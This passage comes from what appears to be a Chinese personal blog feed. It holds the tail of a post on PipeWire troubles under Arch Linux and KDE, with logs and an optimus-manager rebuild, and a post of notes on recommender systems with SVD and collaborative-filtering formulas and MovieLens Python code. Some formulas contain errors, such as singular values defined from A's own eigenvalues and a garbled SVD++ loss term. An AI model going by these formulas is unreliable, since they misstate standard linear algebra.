</ol>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">● pipewire-pulse.service - PipeWire PulseAudio
     Loaded: loaded (&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;user&#x2F;pipewire-pulse.service; enabled; vendor preset: enabled)
     Active: active (running) since Thu 2020-12-03 17:10:09 CST; 12min ago
TriggeredBy: ● pipewire-pulse.socket
   Main PID: 1787 (pipewire-pulse)
     CGroup: &#x2F;user.slice&#x2F;user-1000.slice&#x2F;user@1000.service&#x2F;app.slice&#x2F;pipewire-pulse.service
             └─1787 &#x2F;usr&#x2F;bin&#x2F;pipewire-pulse

12月 03 17:17:02 zjk-allseries pipewire-pulse[1787]: core 0x55fc6c39e410: proxy 0x55fc6c39e410 id:0: bound:-1 seq:1272 res:-32 (Broken pipe) msg:&quot;connection error&quot;
12月 03 17:17:25 zjk-allseries pipewire-pulse[1787]: pulse-server 0x55fc6c30c300: [Google Chrome] ERROR command:42 (FLUSH_PLAYBACK_STREAM) tag:168 error:5 (No such file or directory)
12月 03 17:17:25 zjk-allseries pipewire-pulse[1787]: pulse-server 0x55fc6c30c300: [Google Chrome] ERROR command:41 (CORK_PLAYBACK_STREAM) tag:169 error:5 (No such file or directory)
12月 03 17:17:26 zjk-allseries pipewire-pulse[1787]: pulse-server 0x55fc6c30c300: [Google Chrome] ERROR command:41 (CORK_PLAYBACK_STREAM) tag:170 error:5 (No such file or directory)
12月 03 17:19:16 zjk-allseries pipewire-pulse[1787]: pulse-server 0x55fc6c3deb80: [code] ERROR command:18 (PLAY_SAMPLE) tag:3 error:5 (No such file or directory)
12月 03 17:19:16 zjk-allseries pipewire-pulse[1787]: pulse-server 0x55fc6c3deb80: [code] ERROR command:18 (PLAY_SAMPLE) tag:4 error:5 (No such file or directory)
12月 03 17:19:16 zjk-allseries pipewire-pulse[1787]: pulse-server 0x55fc6c3deb80: [code] ERROR command:18 (PLAY_SAMPLE) tag:5 error:5 (No such file or directory)
12月 03 17:19:17 zjk-allseries pipewire-pulse[1787]: pulse-server 0x55fc6c3deb80: [code] ERROR command:18 (PLAY_SAMPLE) tag:6 error:5 (No such file or directory)
12月 03 17:19:18 zjk-allseries pipewire-pulse[1787]: pulse-server 0x55fc6c3deb80: [code] ERROR command:18 (PLAY_SAMPLE) tag:7 error:5 (No such file or directory)
12月 03 17:19:18 zjk-allseries pipewire-pulse[1787]: pulse-server 0x55fc6c3deb80: [code] ERROR command:18 (PLAY_SAMPLE) tag:8 error:5 (No such file or directory)
***
12月 03 18:58:02 zjk-allseries pipewire-pulse[1787]: pulse-server 0x55fc6c37c6f0: [VirtualBox] ERROR command:23 (GET_SOURCE_INFO) tag:249 error:5 (No such file or directory)
12月 03 19:00:16 zjk-allseries pipewire-pulse[1787]: pulse-server 0x55fc6c37c6f0: [VirtualBox] ERROR command:23 (GET_SOURCE_INFO) tag:376 error:5 (No such file or directory)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>不过貌似都不影响使用</p>
<ol start="2" type="1">
<li>KDE调节音量的按钮换了之后经常卡死（KDE下面整个任务栏都卡死了），恢复之后调节音量无效</li>
</ol>
<p><img src="/pipewire/1606991672.png" /></p>
<ol start="3" type="1">
<li>KDE音频切换设置偶尔卡死</li>
</ol>
<p>下图这个</p>
<p><img src="/pipewire/1606992266.png" /> <img src="/pipewire/1606992430.png" /></p>
<p>点终止之后整个plasma桌面都无了</p>
<p><img src="/pipewire/1606992508.png" /></p>
<ol start="4" type="1">
<li><p>上图中的Build-in Audio切换之后耳机没有声音</p></li>
<li><p>切换外放麦克风和耳机之后再切回来没声了</p></li>
<li><p>有几个人之前说virtualbox会冲突，我这暂时没遇到</p></li>
<li><p>2021.2更新后再次出问题了,<code>pw-cli info 0</code>显示</p></li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Error: <span class="token string">"failed to connect: Host is down"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>检查了一下发现systemd daemon不知道怎么没了。</p>
<pre class="line-numbers language-none"><code class="language-none">Unit pipewire.service could not be found.
Unit pipewire-pulse.service could not be found.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>执行<code>systemctl enable pipewire --user</code>后重启还是找不到</p>
<p><code>systemctl status pipewire-pulse --user</code></p>
<p>报错：</p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">● pipewire-pulse.service - PipeWire PulseAudio
     Loaded: loaded (&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;user&#x2F;pipewire-pulse.service; enabled; vendor preset: enabled)
     Active: active (running) since Sun 2021-02-14 10:03:07 CST; 12min ago
TriggeredBy: ● pipewire-pulse.socket
   Main PID: 1168 (pipewire-pulse)
     CGroup: &#x2F;user.slice&#x2F;user-1000.slice&#x2F;user@1000.service&#x2F;app.slice&#x2F;pipewire-pulse.service
             └─1168 &#x2F;usr&#x2F;bin&#x2F;pipewire-pulse

2月 14 10:15:40 zjk-7591 pipewire-pulse[1168]: pulse-server 0x557a2d6b64f0: failed to connect client: Host is down
2月 14 10:15:40 zjk-7591 pipewire-pulse[1168]: pulse-server 0x557a2d6ceab0: [QPulse] ERROR command:9 (SET_CLIENT_NAME) tag:1 error:6 &gt;
2月 14 10:15:41 zjk-7591 pipewire-pulse[1168]: pulse-server 0x557a2d6b64f0: failed to connect client: Host is down
2月 14 10:15:41 zjk-7591 pipewire-pulse[1168]: pulse-server 0x557a2d6e1cb0: [QPulse] ERROR command:9 (SET_CLIENT_NAME) tag:1 error:6 &gt;
2月 14 10:15:42 zjk-7591 pipewire-pulse[1168]: pulse-server 0x557a2d6b64f0: failed to connect client: Host is down<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="退坑保平安">退坑保平安</h3>
<p>换回PulseAudio了，不当小白鼠了，心累，好几次升级都有小问题，每次内核更新提心吊胆的。</p>
<p>2021.2</p>
<p>最近更新了Pipewire和kernel，开机加载界面的时候只加载出壁纸，kwin慢了十秒，Pipewire daemon加载失败，不想修了，直接换回PulseAudio。</p>
<p>在Pipewire出1.0稳定版和正式支持KDE之前一直用PulseAudio了。</p>
<!-- 如果需要屏幕共享，chrome需要启用WebRTC PipWire支持`chrome://flags/#enable-webrtc-pipewire-capturer`，可能需要用`libpipewire02` -->
<h2 id="参见">参见</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly9waXBld2lyZS5vcmcv">https://pipewire.org/<i class="fa fa-external-link-alt"></i></span><br />
<span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL1BpcGVXaXJl">https://wiki.archlinux.org/index.php/PipeWire<i class="fa fa-external-link-alt"></i></span><br />
<span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvUHVsc2VBdWRpbw==">https://zh.wikipedia.org/wiki/PulseAudio<i class="fa fa-external-link-alt"></i></span><br />
<span class="exturl" data-url="aHR0cHM6Ly9sd24ubmV0L0FydGljbGVzLzczNDEwMy8=">https://lwn.net/Articles/734103/<i class="fa fa-external-link-alt"></i></span><br />
<span class="exturl" data-url="aHR0cHM6Ly9ibG9ncy5nbm9tZS5vcmcvdXJhZXVzLzIwMjAvMDkvMDQvcGlwZXdpcmUtbGF0ZS1zdW1tZXItdXBkYXRlLTIwMjAv">https://blogs.gnome.org/uraeus/2020/09/04/pipewire-late-summer-update-2020/<i class="fa fa-external-link-alt"></i></span><br />
<span class="exturl" data-url="aHR0cHM6Ly9naXRsYWIuZnJlZWRlc2t0b3Aub3JnL3BpcGV3aXJlL3BpcGV3aXJlLy0vd2lraXMvTGltaXRhdGlvbnMtaW4tMC4z">pipewire 0.3的一些局限和问题<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="番外arch滚动更新pyhton3.9">番外：Arch滚动更新pyhton3.9</h2>
<p>昨天晚上回去本来想直接装上pipewire试一下的，结果发现我笔记本外接4k显示器只有一个最高2k的显示选项。而且开机的混合驱动变成只有Intel集显了。</p>
<p>检查了一下是更新python3.9后optimus-manager坏了。</p>
<p>到群里看了一下好多都是因为Optimus Manger更新出了问题，貌似这此升级python3.9的桌面用户黑屏进不去的基本都是Nvidia显卡，Optimus-manager出问题直接SDDM进不去了。</p>
<p>本来以为出问题的只有一个autojump</p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">  File &quot;&#x2F;usr&#x2F;bin&#x2F;autojump&quot;, line 39, in &lt;module&gt;
    from autojump_argparse import ArgumentParser
ModuleNotFoundError: No module named &#39;autojump_argparse&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>然后检查了一下python 3.8 升级 python 3.9 失败的包</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /usr/lib/python3.8/site-packages<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/usr/lib/python3.8/site-packages $ <span class="token function">ls</span>
optimus_manager  optimus_manager-1.3-py3.8.egg-info  __pycache__  tcping-0.1.1rc1-py3.8.egg-info  tcping.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>只有Optimus,autojump和tcping，还好。</p>
<p>重新rebuild编译一下然后再重启Optimus Manager就好了，其他几个同理（如果还不行就用python 3.8 rebuild）</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yay -Rsc optimus-manager-qt
yay -S optimus-manager-qt <span class="token comment"># package to clean build 选 ALL</span>
<span class="token function">sudo</span> systemctl <span class="token builtin class-name">enable</span> optimus-manager
<span class="token function">sudo</span> systemctl start optimus-manager<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>相关issue见 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0Fza2Fubnovb3B0aW11cy1tYW5hZ2VyL2lzc3Vlcy8xNzQ=">https://github.com/Askannz/optimus-manager/issues/174<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <categories>
        <category>不务正业系列</category>
      </categories>
      <tags>
        <tag>pipewire</tag>
      </tags>
  </entry>
  <entry>
    <title>推荐系统笔记</title>
    <url>/bccd/</url>
    <content><![CDATA[<p>要啥DNN、LSTM、BERT啊，真用起来FM就完事了 <span id="more"></span></p>
<h2 id="推荐系统的简单模型">推荐系统的简单模型</h2>
<p>在处理文章、记录、电子病历、购物记录等真实数据时，常常将用户和文本对应，用横纵坐标分别代表用户（m个人）和对应的物品、浏览记录（n个），以每个二维坐标的数值代表用户的喜好程度或浏览时长，可以将用户和物品的关系对应表示成一个<span class="math inline">\(m \times n\)</span>的矩阵<span class="math inline">\(A\)</span>（在推荐系统中通常称为评分矩阵）。这样，在分析不同用户评分或喜好相似程度，不同物品间受欢迎的关联程度等问题都可以转化为矩阵和向量的计算。</p>
<p>假设user对item的打分<span class="math inline">\(\hat{r}_{ui}\)</span>由下式决定</p>
<p><span class="math display">\[
\hat{r}_{ui} = q_i^T p_u + \mu + b_i + b_u
\]</span></p>
<p>其中<span class="math inline">\(q_i\)</span>是第i个item对相应的隐向量，<span class="math inline">\(p_u\)</span>是第u个user对应的隐向量，<span class="math inline">\(b_i\)</span>代表item的偏置，用于解释商品本身的热门和冷门，<span class="math inline">\(b_u\)</span>代表user的偏置，用于解释用户本身的打分偏好（例如有些人喜欢打低分），μ是常数。</p>
<p>为了简便起见，这里先不考虑物品的偏置和常数项，简单的将评分视为用户对物品的打分，评分矩阵表示为：</p>
<p><span class="math display">\[
A_{m \times n} = U_{m \times r}V_{r \times n}^T
\]</span></p>
<p>其中，<span class="math inline">\(U\)</span>表示用户对隐含特征的偏好矩阵，<span class="math inline">\(V\)</span>表示物品对隐含特征的归属矩阵。</p>
<figure>
<img src="/bccd/mfcf.png" alt="User-item" /><figcaption aria-hidden="true">User-item</figcaption>
</figure>
<p>通常，用户数量可能大于几千甚至几万几十万，而电商物品、电影书籍或文章的数量也通常高于几千。一个用户通常会浏览或评论几个物品，此时的评分矩阵是一个维度很大的稀疏矩阵，这时需要用到降维等方法进行计算。（这里将维度简单的视为矩阵的秩）矩阵分解（Matrix Factorization）是一类常用的降维方法，包括经典的特征值、奇异值分解，以及对于奇异值分解的多种改进方法，以及新的非负矩阵分解和概率矩阵分解等新算法。</p>
<p>最简单的矩阵分解是特征值分解，将方阵<span class="math inline">\(A\)</span>分解为</p>
<p><span class="math display">\[
A_{n \times n} = Q \lambda Q^{-1}
\]</span></p>
<p>只要取对角矩阵<span class="math inline">\(\lambda\)</span>的前k大的k个特征值，舍弃其他特征值，得到维度为k的近似矩阵<span class="math inline">\(A&#39;\)</span>，维度就降为了k。但是实际的数据几乎没有方阵，此时就要用到特征值分解等其他方法。</p>
<h2 id="奇异值分解">奇异值分解</h2>
<p>计算奇异值分解的时间复杂度为<span class="math inline">\(O(N^3)\)</span>，不过通常稀疏矩阵的计算中，计算量会远小于<span class="math inline">\(O(N^3)\)</span></p>
<p>评分矩阵<span class="math inline">\(A_{m \times n}\)</span>可以分解为</p>
<p><span class="math display">\[
A_{m\times n}=U_{m\times k}\Sigma_{k\times k}V^T_{k\times n}
\]</span></p>
<p>其中，<span class="math inline">\(U\)</span>是酉矩阵，<span class="math inline">\(\Sigma\)</span>为对角矩阵，对角元的奇异值为<span class="math inline">\(\sigma_i = \sqrt{\lambda_i}\)</span>，其中<span class="math inline">\(\lambda_i\)</span>为矩阵<span class="math inline">\(A\)</span>的特征值</p>
<p>为了方便，以下分析过程省略矩阵下标。</p>
<p>由于</p>
<p><span class="math display">\[
(AA^T)u_i = \lambda_i u_i
\]</span></p>
<p>计算<span class="math inline">\(U\)</span>可以用<span class="math inline">\(AA^T\)</span>的所有特征向量得到</p>
<p>类似的，</p>
<p><span class="math display">\[
(A^TA)v_i = \lambda_i v_i
\]</span></p>
<p>计算<span class="math inline">\(V\)</span>可以用<span class="math inline">\(A^TA\)</span>的所有特征向量得到</p>
<p>求奇异值可以使用下面的方法</p>
<p><span class="math display">\[
A=U\Sigma V^T \Rightarrow AV=U\Sigma V^TV \Rightarrow AV=U\Sigma \Rightarrow  Av_i = \sigma_i u_i  \Rightarrow  \sigma_i =  Av_i / u_i
\]</span></p>
<p>此时矩阵分解的复杂度为<span class="math inline">\(O((max(m,n)^3)\)</span></p>
<p>通常在实际计算时会舍弃很多奇异值，用前k大的k个奇异值来近似估计原矩阵，此时维度降为k</p>
<p><span class="math display">\[
A_{m \times n} = U_{m \times m}\Sigma_{m \times n} V^T_{n \times n} \approx U_{m \times k}\Sigma_{k \times k} V^T_{k \times n}
\]</span></p>
<p><img src="/bccd/SVD.png" /></p>
<p>在考虑用户的偏见和物品的偏置后，评分会更加复杂，损失函数变为</p>
<p><span class="math display">\[
C = \sum_{(u,i)\in{R}}(r_{u,i} - b_i - b_u - u_u*v_i^T)^2 + \lambda(\parallel {u_u} \parallel ^2 + \parallel{v_i}\parallel ^2 + b_u^2 + b_i^2)
\]</span></p>
<p>其中<span class="math inline">\(r_{u,i}\)</span>为包含用户偏见和物品偏置的评分。</p>
<p>当加入了用户对物品的隐式行为，评分变为</p>
<p><span class="math display">\[
r_{u,i} = \mu + b_i + b_u + v_i^T * (u_u + \mid{I_u}\mid^{-\frac{1}{2}}* \sum_{j\in I_u}{y_j})
\]</span></p>
<p>其中<span class="math inline">\(I_u\)</span>是该用户有隐式行为的所有物品集合，而<span class="math inline">\(y_j\)</span>是隐式评分电影j反应出的喜好值。损失函数相应的变为：</p>
<p><span class="math display">\[
\begin{equation}
\begin{split}
C = \sum_{(u,i)\in{R}}(a_{u,i} - u - b_u - b_i - v_i^T* (u_u + \min I_u \mid^{-\frac{1}{2}}\sum_{j \in I_u}y_j))^2 \\
 + \lambda(\sum_u(bi_u^2 + \parallel{u_u}\parallel^2) + \sum_i(b_i^2 + \parallel{v_i}\parallel^2 + \parallel{y_j}\parallel^2)))
\end{split}
\end{equation}
\]</span></p>
<p>对此式的分解算法优化成为SVD++算法，较为复杂，此处不详细推导。此外，还有将时间流逝用户兴趣变化纳入考虑的多种推荐评分的改进版，奇异值分解计算与普通的评分矩阵类似。</p>
<p>实际计算稀疏矩阵奇异值分解的时候，会采用因子机(Factorization Machine, FM)模型或者FFM模型或者交替最小二乘法(Alternating Least Squares)算法加速奇异值的计算。其中，因子机算法在实际商业公司的推荐算法中使用最广。 <img src="https://tracholar.github.io/assets/images/ffm.png" alt="ffm.png" /></p>
<h2 id="非负矩阵分解">非负矩阵分解</h2>
<p>非负矩阵分解的一些算法的时间复杂度效果好于SVD的分解算法。</p>
<p>然而各种看起来没多少优化好的库函数，更不要提什么多线程或者分布式版本，，真用起来自己写一个或者现成的库大概率跑不过原有的模型，所以没太多人用</p>
<h2 id="计算相似度">计算相似度</h2>
<h3 id="协同过滤算法">协同过滤算法</h3>
<p>最老最经典的一个算法了，通过计算相似度给用户推荐兴趣和关注点相似用户的感兴趣内容。</p>
<h4 id="基于物品的协同过滤">基于物品的协同过滤</h4>
<p>（item-based collaborative filtering，ItemCF） 找到物品之间的属性关联，向用户推荐属性相似的物品 设N(i)是喜欢i物品的用户数 相似度：</p>
<p><span class="math display">\[w_{ij}=\frac{|N(i)\cap N(j)|}{|N(j)|}\]</span></p>
<p>避免热门物品干扰，改为</p>
<p><span class="math display">\[w_{ij}=\frac{|N(i)\cap N(j)|}{\sqrt{|N(j)||N(i)|}}\]</span></p>
<h4 id="基于用户的协同过滤">基于用户的协同过滤</h4>
<p>（User-based collaborative filtering，UserCF） 找到和用户相似的其他用户，将其他用户感兴趣的产品推荐给用户。还有一种是“购买过XXX等用户也XXX”，算是这个方法的一个变种</p>
<p>计算相似度，N(u)是用户正反馈的集合，N(v)是用户负反馈物品的集合 Jaccard相似度：</p>
<p><span class="math display">\[w_{u,v}= \frac{|N(u)\cap N(v)|}{|N(u)\cup N(v)|}\]</span></p>
<p>余弦相似度：</p>
<p><span class="math display">\[w_{u,v}= \frac{|N(u)\cap N(v)|}{\sqrt{|N(u)||N(v)|}}\]</span></p>
<p>余弦相似度用的特别多</p>
<h2 id="冷启动问题">冷启动问题</h2>
<p>等待填坑，利用用户注册信息，人工标注等。 已经弃坑，冷启动这个不太好搞，搞不太定。</p>
<h2 id="大众行为个性化推荐">大众行为/个性化推荐</h2>
<p>等待填坑。 半弃坑，没怎么深入做</p>
<h2 id="imdb电影评论推荐例子">imdb电影评论推荐例子</h2>
<p>还是用最最经典的那个电影评分抄袭过来作为示例吧，用户的打分</p>
<p>这里使用<span class="exturl" data-url="aHR0cDovL2ZpbGVzLmdyb3VwbGVucy5vcmcvZGF0YXNldHMvbW92aWVsZW5zLw==">movielens数据集<i class="fa fa-external-link-alt"></i></span>， 数据集的rating.csv包括用户id，物品id，评分，评论时间。(这个csv文件第一行是userid，movieid，·····，把第一行直接删掉或者从第二行开始读取，不然会报TypeError: unsupported operand type(s) for -: 'str' and 'int'的错) 使用的算法是SVD矩阵分解。构建一个用户-物品矩阵，每一项的值是评分，这是一个极其稀疏的矩阵 我们导入数据集并分割：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">header <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'user_id'</span><span class="token punctuation">,</span> <span class="token string">'item_id'</span><span class="token punctuation">,</span> <span class="token string">'rating'</span><span class="token punctuation">,</span> <span class="token string">'timestamp'</span><span class="token punctuation">]</span>  <span class="token comment"># 用户id，物品id，评分，评论时间</span>

df <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_csv<span class="token punctuation">(</span><span class="token string">'../data/u.data'</span><span class="token punctuation">,</span> sep<span class="token operator">=</span><span class="token string">'\t'</span><span class="token punctuation">,</span> names<span class="token operator">=</span>header<span class="token punctuation">)</span>
n_users <span class="token operator">=</span> df<span class="token punctuation">.</span>user_id<span class="token punctuation">.</span>unique<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>  <span class="token comment">#用户数量</span>
n_items <span class="token operator">=</span> df<span class="token punctuation">.</span>item_id<span class="token punctuation">.</span>unique<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>  <span class="token comment">#物品数量</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Number of users = '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>n_users<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' | Number of movies = '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>n_items<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># 数据集分割——训练集：测试集 = 3:1</span>
train_data<span class="token punctuation">,</span>test_data <span class="token operator">=</span> train_test_split<span class="token punctuation">(</span>df<span class="token punctuation">,</span> test_size <span class="token operator">=</span> <span class="token number">0.25</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>建立评分矩阵</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">train_data_matrix <span class="token operator">=</span> np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span><span class="token punctuation">(</span>n_users<span class="token punctuation">,</span> n_items<span class="token punctuation">)</span><span class="token punctuation">)</span>
test_data_matrix <span class="token operator">=</span> np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span><span class="token punctuation">(</span>n_users<span class="token punctuation">,</span> n_items<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment">#使用 pandas 遍历行数据</span>
<span class="token keyword">for</span> line <span class="token keyword">in</span> train_data<span class="token punctuation">.</span>itertuples<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment">#训练集评分矩阵</span>
    train_data_matrix<span class="token punctuation">[</span>line<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> line<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> line<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> line <span class="token keyword">in</span> test_data<span class="token punctuation">.</span>itertuples<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment">#测试集评分矩阵</span>
    test_data_matrix<span class="token punctuation">[</span>line<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> line<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> line<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>计算余弦相似度：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">user_similarity <span class="token operator">=</span> pairwise_distances<span class="token punctuation">(</span>train_data_matrix<span class="token punctuation">,</span> metric <span class="token operator">=</span> <span class="token string">"cosine"</span><span class="token punctuation">)</span>  <span class="token comment"># 计算余弦距离</span>
item_similarity <span class="token operator">=</span> pairwise_distances<span class="token punctuation">(</span>train_data_matrix<span class="token punctuation">.</span>T<span class="token punctuation">,</span> metric <span class="token operator">=</span> <span class="token string">"cosine"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>基于用户和基于物品的协同过滤</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">predict</span><span class="token punctuation">(</span>rating<span class="token punctuation">,</span> similarity<span class="token punctuation">,</span> <span class="token builtin">type</span> <span class="token operator">=</span> <span class="token string">'user'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token builtin">type</span> <span class="token operator">==</span> <span class="token string">'user'</span><span class="token punctuation">:</span>
        <span class="token comment"># </span>
        mean_user_rating <span class="token operator">=</span> rating<span class="token punctuation">.</span>mean<span class="token punctuation">(</span>axis <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token comment">#mean函数：压缩列，对各行求均值，返回 m *1 矩阵</span>
        <span class="token comment"># print(mean_user_rating)</span>
        rating_diff <span class="token operator">=</span> <span class="token punctuation">(</span>rating <span class="token operator">-</span> mean_user_rating<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span>np<span class="token punctuation">.</span>newaxis<span class="token punctuation">]</span><span class="token punctuation">)</span>
        pred <span class="token operator">=</span> mean_user_rating<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span>np<span class="token punctuation">.</span>newaxis<span class="token punctuation">]</span> <span class="token operator">+</span> similarity<span class="token punctuation">.</span>dot<span class="token punctuation">(</span>rating_diff<span class="token punctuation">)</span> <span class="token operator">/</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span>np<span class="token punctuation">.</span><span class="token builtin">abs</span><span class="token punctuation">(</span>similarity<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">sum</span><span class="token punctuation">(</span>axis<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>T
        <span class="token comment">#dot函数：矩阵相乘；np.abs()：矩阵元素的绝对值  .T:转置</span>
        <span class="token comment"># print('test',pred.min())</span>
    <span class="token keyword">elif</span> <span class="token builtin">type</span> <span class="token operator">==</span> <span class="token string">'item'</span><span class="token punctuation">:</span>
        pred <span class="token operator">=</span> rating<span class="token punctuation">.</span>dot<span class="token punctuation">(</span>similarity<span class="token punctuation">)</span> <span class="token operator">/</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span>np<span class="token punctuation">.</span><span class="token builtin">abs</span><span class="token punctuation">(</span>similarity<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">sum</span><span class="token punctuation">(</span>axis<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token comment"># print('test2',pred.max())</span>
    <span class="token keyword">return</span> pred<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">item_prediction <span class="token operator">=</span> predict<span class="token punctuation">(</span>train_data_matrix<span class="token punctuation">,</span> item_similarity<span class="token punctuation">,</span> <span class="token builtin">type</span> <span class="token operator">=</span> <span class="token string">'item'</span><span class="token punctuation">)</span>
user_prediction <span class="token operator">=</span> predict<span class="token punctuation">(</span>train_data_matrix<span class="token punctuation">,</span> user_similarity<span class="token punctuation">,</span> <span class="token builtin">type</span> <span class="token operator">=</span> <span class="token string">'user'</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>item_prediction<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>item_prediction<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>np<span class="token punctuation">.</span>argsort<span class="token punctuation">(</span>item_prediction<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>计算均方误差</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">rmse</span><span class="token punctuation">(</span>prediction<span class="token punctuation">,</span> ground_truth<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># 计算均方误差</span>
    <span class="token comment">#nonzero(a)返回数组a中值不为零的元素的下标</span>
    <span class="token comment">#flatten()创建矩阵</span>
    prediction <span class="token operator">=</span> prediction<span class="token punctuation">[</span>ground_truth<span class="token punctuation">.</span>nonzero<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span>flatten<span class="token punctuation">(</span><span class="token punctuation">)</span>
    ground_truth <span class="token operator">=</span> ground_truth<span class="token punctuation">[</span>ground_truth<span class="token punctuation">.</span>nonzero<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span>flatten<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> sqrt<span class="token punctuation">(</span>mean_squared_error<span class="token punctuation">(</span>prediction<span class="token punctuation">,</span> ground_truth<span class="token punctuation">)</span><span class="token punctuation">)</span>
